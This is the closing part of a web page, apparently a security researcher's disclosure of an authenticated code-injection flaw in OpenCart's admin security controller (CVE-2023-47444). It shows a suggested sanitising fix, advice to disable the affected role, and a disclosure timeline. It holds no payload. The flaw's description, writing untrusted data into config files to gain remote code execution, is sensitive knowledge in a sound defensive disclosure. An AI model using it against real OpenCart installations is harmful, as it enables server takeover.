<span class="o">+</span>    <span class="nv">$name</span> <span class="o">=</span> <span class="nb">preg_replace</span><span class="p">(</span><span class="s1">'/[^a-zA-Z0-9]/'</span><span class="p">,</span> <span class="s1">''</span><span class="p">,</span> <span class="nb">basename</span><span class="p">(</span><span class="nb">html_entity_decode</span><span class="p">(</span><span class="nb">trim</span><span class="p">((</span><span class="n">string</span><span class="p">)</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="n">request</span><span class="o">-&gt;</span><span class="n">get</span><span class="p">[</span><span class="s1">'name'</span><span class="p">]),</span> <span class="no">ENT_QUOTES</span><span class="p">,</span> <span class="s1">'UTF-8'</span><span class="p">)));</span>
<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
    <span class="nv">$name</span> <span class="o">=</span> <span class="s1">'admin'</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div> <p>Furthermore, disable the <code class="language-plaintext highlighter-rouge">common/security</code> role for every user until a patch will be available.<br /> 16/11/2023 update: A partial fix only affecting the <code class="language-plaintext highlighter-rouge">storage</code> function (<a href="https://github.com/opencart/opencart/pull/12951">#12951</a>) has been merged to master.</p> <h2 id="disclosure-timeline"> <a href="#disclosure-timeline" class="anchor-heading" aria-labelledby="disclosure-timeline"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Disclosure Timeline </h2> <blockquote> <p><em>Please refer to the <a href="https://0xbro.red/disclosures/policy/">disclosure policy</a> page for further details about the disclosure policy adopted by 0xbro.</em><br /></p> </blockquote> <ul> <li><strong>14/10/2023</strong>: Discovered both the vulnerabilities in <code class="language-plaintext highlighter-rouge">opencart/upload/admin/controller/common/security.php</code><br /></li> <li><strong>17/10/2023</strong>: Contacted OpenCart at <code class="language-plaintext highlighter-rouge">support@opencart.com</code> (without receiving any response).<br /></li> <li><strong>24/10/2023</strong>: Contacted OpenCart at <code class="language-plaintext highlighter-rouge">webmaster@opencart.com</code>.<br /></li> <li><strong>30/10/2023</strong>: Following the official <a href="https://github.com/opencart/opencart#reporting-a-bug">guidelines</a>, published a <a href="https://forum.opencart.com/viewtopic.php?t=232348">post</a> on the official OpenCart forum.<br /></li> <li><strong>02/11/2023</strong>: Sent a PM to an Administrator on the official OpenCart forum.<br /></li> <li><strong>10/11/2023</strong>: Assigned <a href="https://www.cve.org/CVERecord?id=CVE-2023-47444">CVE-2023-47444</a></li> <li><strong>10/11/2023</strong>: Sent a PM to another Administrator on the official OpenCart forum as a very last resort to contact the OpenCart staff.<br /></li> <li><strong>11/11/2023</strong>: Get a <em>kindly</em> response from an OpenCart Administrator <img src="/assets/images/disclosures/opencart-rce-CVE-2023-47444/email.png" alt="email" width="550" /></li> <li><strong>14/11/2023</strong>: Public release and opened a GitHub issue (<a href="https://github.com/opencart/opencart/issues/12947">#12947</a>)</li> <li><strong>15/11/2023</strong>: Opened a pull request (<a href="https://github.com/opencart/opencart/pull/12949">#12949</a>) with a hotfix, but closed immediately by administrator. GitHub issue also closed by administrator after having marked it as spam and a “non vulnerability”.</li> <li><strong>16/11/2023</strong>: Partial fix - only affecting the <code class="language-plaintext highlighter-rouge">storage</code> function (<a href="https://github.com/opencart/opencart/pull/12951">#12951</a>) merged to master</li> </ul> <style> .share { display: block; margin-left: auto; margin-right: auto; text-align: center; text-decoration: none; } </style> <p><br /></p> <section class="share"> <h2> <a href="#disclosure-timeline" class="anchor-heading" aria-labelledby="disclosure-timeline"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Share </h2> <a aria-label="Share on Twitter" style="text-decoration: none" href="https://twitter.com/intent/tweet?text=Static Code Injections in OpenCart (CVE-2023-47444)%20https://0xbro.red/disclosures/disclosed-vulnerabilities/opencart-CVE-2023-47444/%20via%20&#64;sec_0xbro&amp;hashtags=OpenCart,code-injection,php,CVE-2023-47444," onclick="window.open(this.href, 'twitter-share', 'width=550,height=235');return false;" title="Share on Twitter"> <svg class="icon icon-twitter-color"><use xlink:href="#icon-twitter-color"></use></svg> </a> <a aria-label="Share on Facebook" style="text-decoration: none" href="https://www.facebook.com/sharer/sharer.php?u=https://0xbro.red/disclosures/disclosed-vulnerabilities/opencart-CVE-2023-47444/" onclick="window.open(this.href, 'facebook-share','width=580,height=296');return false;" title="Share on Facebook"> <svg class="icon icon-facebook-color"><use xlink:href="#icon-facebook-color"></use></svg> </a> <a aria-label="Share on Linkedin" style="text-decoration: none" href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https://0xbro.red/disclosures/disclosed-vulnerabilities/opencart-CVE-2023-47444/&amp;title=Authenticated Static Code Injections in OpenCart (CVE-2023-47444)&amp;summary=In OpenCart versions 4.0.0.0 to 4.0.2.3, authenticated backend users having common/security access and modify privileges can write arbitrary untrusted data inside config.php and admin/config.php, resulting in remote code execution on the underlying server.&amp;source=" onclick="window.open(this.href, 'linkedin-share','width=580,height=296');return false;" title="Share on Linkedin"> <svg class="icon icon-linkedin-color"><use xlink:href="#icon-linkedin-color"></use></svg> </a> </section> <div class="footnotes" role="doc-endnotes"> <ol> <li id="fn:basename" role="doc-endnote"> <p><a href="https://www.php.net/manual/en/function.basename.php"><code class="language-plaintext highlighter-rouge">basename</code></a>, php.net <a href="#fnref:basename" class="reversefootnote" role="doc-backlink">&#8617;</a> <a href="#fnref:basename:1" class="reversefootnote" role="doc-backlink">&#8617;<sup>2</sup></a></p> </li> <li id="fn:3763" role="doc-endnote"> <p><a href="https://nvd.nist.gov/vuln/detail/CVE-2011-3763">CVE-2011-3763</a>, nvd.nist.gov <a href="#fnref:3763" class="reversefootnote" role="doc-backlink">&#8617;</a></p> </li> <li id="fn:1891" role="doc-endnote"> <p><a href="https://security.snyk.io/vuln/SNYK-PHP-OPENCARTOPENCART-2935892">CVE-2013-1891</a>, security.snyk.io <a href="#fnref:1891" class="reversefootnote" role="doc-backlink">&#8617;</a></p> </li> </ol> </div> </main> <hr> <footer> <p><a href="#top" id="back-to-top">↩ Back to top</a></p> <p align="center">Made by <code>0x<i>bro</i></code> with ❤️</p><br> <p align="center" class="text-small text-grey-dk-100 mb-0"> <a rel="license" href="http://creativecommons.org/licenses/by-sa/4.0/"><img alt="Creative Commons License" style="border-width:0" src="https://i.creativecommons.org/l/by-sa/4.0/88x31.png" /></a><br /> This work is licensed <a rel="license" href="http://creativecommons.org/licenses/by-sa/4.0/">CC BY-SA 4.0</a>.</a><br> Copyright &copy; 2019-2025 Mattia <i>0xbro</i> Brollo<br> <a href="https://0xbro.red/feed/articles.xml"><svg class="icon-rss-color" width="15" height="9"><use xlink:href="#icon-rss-color"></use></svg>Articles feed</a><br> <a href="https://0xbro.red/feed/disclosures.xml"><svg class="icon-rss-color" width="15" height="9"><use xlink:href="#icon-rss-color"></use></svg>Disclosures feed</a> </p> </footer> </div> </div> <button id="search-button" class="search-button btn-reset" aria-label="Focus on search"> <svg viewBox="0 0 24 24" class="icon" aria-hidden="true"><use xlink:href="#svg-search"></use></svg> </button> <div class="search-overlay"></div> </div> <script type="module"> import mermaid from 'https://cdn.jsdelivr.net/npm/mermaid@11.4.1/dist/mermaid.esm.min.mjs'; var config = {} ; mermaid.initialize(config); mermaid.run({ querySelector: '.language-mermaid', }); </script> </body> </html>
